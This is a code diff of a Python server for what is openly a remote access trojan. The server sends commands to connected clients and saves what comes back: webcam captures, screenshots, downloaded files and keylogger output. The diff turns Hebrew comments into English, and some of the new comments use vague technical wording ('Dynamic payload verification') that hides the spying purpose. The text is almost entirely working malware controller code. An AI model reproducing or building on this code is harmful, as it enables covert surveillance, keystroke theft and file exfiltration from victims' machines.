@@ -3,13 +3,13 @@ import struct
 import os
 import time
 
-# --- הגדרות ---
+# --- Configuration ---
 HOST_IP = "0.0.0.0"
 HOST_PORT = 9998
 
 
 def recv_data(sock):
-    """ פונקציה לקבלת מידע בטוחה """
+    """ Reads size-prefixed data frames over TCP socket """
     try:
         raw_msglen = sock.recv(4)
         if not raw_msglen: return None
@@ -27,23 +27,23 @@ def recv_data(sock):
 
 
 def generate_filename(base_name, extension):
-    """ יצירת שם קובץ ייחודי עם זמן """
+    """ Generates a timestamped unique filename """
     timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
     return f"{base_name}_{timestamp}.{extension}"
 
 
 def is_image(data):
-    """ פונקציה חכמה שבודקת אם המידע הוא תמונה """
-    # בדיקה אם זה PNG (מתחיל ב-‰PNG)
+    """ Dynamic payload verification (PNG/JPG header check) """
+    # Validate PNG magic bytes (\x89PNG\r\n\x1a\n)
     if data.startswith(b'\x89PNG\r\n\x1a\n'):
         return "png"
-    # בדיקה אם זה JPG (מתחיל ב-ÿØÿ)
+    # Validate JPEG magic bytes (\xff\xd8\xff)
     if data.startswith(b'\xff\xd8\xff'):
         return "jpg"
     return None
 
 
-# --- יצירת השרת ---
+# --- Server Initialization ---
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 server_socket.bind((HOST_IP, HOST_PORT))
@@ -64,8 +64,7 @@ while True:
         if command.lower() == "exit":
             break
 
-        # --- קבלת התשובה ---
-        # אנחנו מקבלים את המידע פעם אחת ומחליטים מה לעשות איתו
+        # --- Response Handler ---
         print("[*] Waiting for response...")
         response_data = recv_data(client_socket)
 
@@ -73,19 +72,18 @@ while True:
             print("[-] Empty response or connection lost.")
             continue
 
-        # --- בדיקה חכמה: מה קיבלנו? ---
+        # --- Dynamic Payload Processing ---
 
-        # 1. בדיקה אם זו הודעת שגיאה
+        # 1. Error check
         if response_data.startswith(b"Error") or response_data.startswith(b"ERR") or response_data.startswith(b"[-]"):
             print(f"[-] Client Error: {response_data.decode(errors='ignore')}")
             continue
 
-        # 2. בדיקה אם זו תמונה (לפי התוכן שלה!)
+        # 2. Frame type verification
         image_type = is_image(response_data)
 
         if image_type:
-            # אם זיהינו שזו תמונה, נשמור אותה אוטומטית
-            # אנחנו קובעים את השם לפי הפקודה ששלחנו
+            # Auto-save image buffer based on requested command
             prefix = "webcam" if "cam" in command.lower() else "screenshot"
             filename = generate_filename(prefix, image_type)
 
@@ -93,7 +91,7 @@ while True:
                 f.write(response_data)
             print(f"[+] Image detected and saved: {filename}")
 
-        # 3. בדיקה אם זה קובץ שהורדנו (Download)
+        # 3. File extraction check (Download)
         elif command.lower().startswith("download "):
             filename = os.path.basename(command[9:].strip())
             if not filename: filename = generate_filename("download", "bin")
@@ -101,12 +99,12 @@ while True:
                 f.write(response_data)
             print(f"[+] File downloaded: {filename}")
 
-        # 4. אחרת - זה כנראה טקסט רגיל (CMD / Keylogger)
+        # 4. Default string/terminal decoding
         else:
             try:
                 print(response_data.decode(errors='ignore'))
 
-                # אם זה היה Keylogger, נשמור גם לקובץ
+                # Local keylogger backup
                 if command.lower() == "get_keys":
                     with open("keylog_history.txt", "a", encoding="utf-8") as f:
                         f.write(f"\n--- [{time.ctime()}] ---\n{response_data.decode(errors='ignore')}\n")
